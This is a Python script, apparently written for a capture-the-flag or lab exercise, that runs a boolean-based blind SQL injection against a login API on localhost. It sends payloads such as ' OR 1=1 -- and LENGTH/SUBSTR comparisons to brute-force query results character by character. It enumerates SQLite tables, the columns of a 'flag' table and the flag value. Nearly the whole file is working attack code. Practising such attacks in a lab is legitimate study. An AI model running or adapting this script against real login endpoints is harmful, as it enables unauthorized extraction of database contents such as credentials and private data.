import requests
import re
import string

"""
class requests.Request(
    method: str | None = None, 
    url: _t.UriType | None = None, 
    headers: _t.HeadersType = None, 
    files: _t.FilesType = None, 
    data: _t.DataType = None, 
    params: _t.ParamsType = None, 
    auth: _t.AuthType = None, 
    cookies: RequestsCookieJar | CookieJar | dict[str, str] | None = None, 
    hooks: _t.HooksInputType | None = None, 
    json: _t.JsonType = None
)
"""

# 每次设置 SQL 注入模板，传递暴破载荷
def sqli_req(payload):
    """ 
    sqli 注入示例
    ```http
    POST /api/v1/login/ HTTP/1.1
    Host: 127.0.0.1:8000
    Content-Type: application/json
    Content-Length: 46

    {"username":"' OR 1=1 -- ","password":"peter"}
    ```
    """

    req = requests.Request(
        method = 'POST', 
        url = "http://127.0.0.1:8000/api/v1/login/",
        json = {"username":payload, "password":"peter"}
        )
    pre_req = req.prepare()
    # print_prepare_req(pre_req)

    session = requests.Session()
    res = session.send(pre_req)
    # print_res(res)
    return pre_req, session, res

def regex_grep_data(res: requests.Response, re_pattern: re.Pattern):
    """
    正则表达式提取示例
    """
    # 提取上下文 `{"status":"success"}`
    regex_list = re.findall(re_pattern, res.text)
    # print(regex_list)
    grep_data = regex_list[-1]
    # print(grep_data)
    return grep_data

def sqli_get_length(query, re_pattern, payload_template):
    # 循环检测字符串长度
    data_length = 0
    for test_len in range(512):
        # 载荷仅修改长度数字

        # payload = f"""' OR LENGTH(({query}))>={test_len} --"""
        payload = payload_template.format(query=query, test_len=test_len)

        pre_req, session, res = sqli_req(payload)
        grep_data = regex_grep_data(res, re_pattern)
        # 此处设置为字符串型触点，之后或改进为传递参数，以及设置其他触点，如响应代码
        if grep_data != "success":
            data_length = test_len - 1
            break

    # 若未找到则抛出异常
    if data_length == 0:
        raise ValueError(f"data_length faile")
    return data_length



def sqli_get_data(query, data_length, charset, re_pattern: re.Pattern, payload_template, debug=False):
    # 暴破字符，偏移从1而不是0开始
    data_list = []
    for start_position in range(1, data_length + 1):
        for test_char in charset:
            
            # payload_template = """' OR unicode(SUBSTR(({query}),{start_position},1))={char_ascii} --"""
            char_ascii = ord(test_char)
            payload = payload_template.format(query=query, start_position=start_position, char_ascii=char_ascii) 

            pre_req, session, res = sqli_req(payload)
            grep_data = regex_grep_data(res, re_pattern)
            if grep_data == "success":
                data_list.append(test_char)
                # 设置 debug 时，打印当前进度
                if debug: print(f"data_list: {data_list}")
                break

        # 若未找到则抛出异常
        if len(data_list) != start_position:
            raise ValueError(f"not found {start_position}")

    return "".join(data_list)

# full_charset 可打印字符集
# sql_charset 数据库的字段命名字符集，数量更少
full_charset = string.printable
sql_charset = "_$" + string.digits + string.ascii_letters

# 使用响应的字符串作为 hit/miss 时，使用正则表达式提取
re_pattern = re.compile(r'''{"status":"(.+?)"}''')

# 查询长度 -> 查询数据
def do_query(query, charset):
    print(f"cur_query: {query}")

    ## 注意，查询需被括号包裹
    ## 注意，由于每个数据库以及版本的函数不一，每次均需调整。或者构建一个映射表
    payload_template = """' OR LENGTH(({query}))>={test_len} --"""
    data_length = sqli_get_length(query, re_pattern, payload_template)
    print(f"data_length: {data_length}")

    payload_template = """' OR unicode(SUBSTR(({query}),{start_position},1))={char_ascii} --"""
    data_string = sqli_get_data(query, data_length, charset, re_pattern, payload_template)
    print(f"data_string: {data_string}\n")

# do_query("sqlite_version()", full_charset)

# 使用组字符串连接
## 注意此处使用缩小的字符集，使用的连接符被限制
# do_query("SELECT GROUP_CONCAT(name, '$') FROM sqlite_master WHERE type = 'table'", sql_charset)

do_query("SELECT GROUP_CONCAT(name, '$') FROM pragma_table_info('flag')", sql_charset)

# do_query("SELECT flag FROM flag", full_charset)